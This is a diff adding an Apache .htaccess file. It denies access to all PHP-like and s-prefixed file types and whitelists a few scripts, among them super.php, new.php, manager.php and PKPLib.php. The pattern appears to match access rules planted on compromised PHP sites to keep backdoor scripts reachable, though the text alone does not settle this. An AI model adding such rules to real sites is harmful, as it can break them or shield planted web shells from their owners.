@@ -1,0 +1,34 @@
+<Files *.ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+
+<Files *.S*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+
+<Files *.s*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+
+<FilesMatch "^(super.php|site.php|PKPLib.php|PKPConfiguration.php|new.php|manager.php|info.php|index.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
